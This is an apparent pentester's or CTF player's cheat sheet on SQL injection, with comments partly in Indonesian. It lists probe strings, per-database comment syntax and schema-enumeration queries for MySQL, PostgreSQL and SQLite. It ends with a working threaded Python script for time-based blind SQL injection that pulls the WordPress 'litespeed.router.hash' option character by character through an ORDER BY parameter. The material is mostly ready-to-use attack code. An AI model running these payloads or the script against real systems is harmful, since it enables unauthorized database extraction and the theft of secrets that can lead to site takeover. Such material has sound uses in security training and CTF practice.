# SQL Injection

## NoSQL?

{% embed url="https://hacktricks.boitatech.com.br/pentesting-web/nosql-injection" %}

## Recon

```sql

# testing payloads
'
"
`
')
")
`)
'))
"))
`))
​
# comments
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments# comments

```

<pre class="language-sql"><code class="lang-sql">
<strong># postgres, mysql
</strong>1. schema_name FROM information_schema.schemata - ambil database
2. table_name/GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='ZZZ' LIMIT 1 OFFSET 0 - ambil table
3. column_name FROM information_schema.columns WHERE table_name='ZZZ' - ambil column
​
## Special
FROM information_schema.processlist # ambil process yg dijalankan 
​
# sqlite
0. select sqlite_version();
1. SELECT sql FROM sqlite_schema / sql FROM sqlite_master
2. SELECT tbl_name FROM sqlite_master WHERE type='table' / SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
3. a. SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' 
   b. SELECT GROUP_CONCAT(name) FROM pragma_table_info('table_name');

</code></pre>

### Time Based Blind SQL Injection With Threading <a href="#time-based-blind-sql-injection-with-threading" id="time-based-blind-sql-injection-with-threading"></a>

```python
import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = 'localhost'
LEN_FLAG = 20
THREADS = 4

# Kondisi ketika query sql true
def isBenar(response):
    return response.elapsed.total_seconds() > 2

def sqli(pos, mid):
    payload = 'select option_value from wp_options where option_name="litespeed.router.hash"'
    
    params = {
        'count': 'a',
        'offset': 'b',
        'order': f'ASC, (SELECT IF((ASCII(SUBSTRING(({payload}),{pos},1)))>{mid},SLEEP(2),SLEEP(0))) -- ',
    }
    response = requests.get(URL, params=params)
    return isBenar(response)

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

def worker(pos):
    return pos, get_char(pos)

flag = [''] * LEN_FLAG  # Pre-allocate a list for flag characters
threads = THREADS  # Number of threads to use

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = {executor.submit(worker, i): i for i in range(0, LEN_FLAG)}

    for future in tqdm(as_completed(futures), total=len(futures)):
        pos, char = future.result()
        flag[pos - 1] = char  # Adjust index as positions are 1-based
        if '}' in flag:
            break

final_flag = ''.join(flag).strip()
print("Final flag:", final_flag)
```
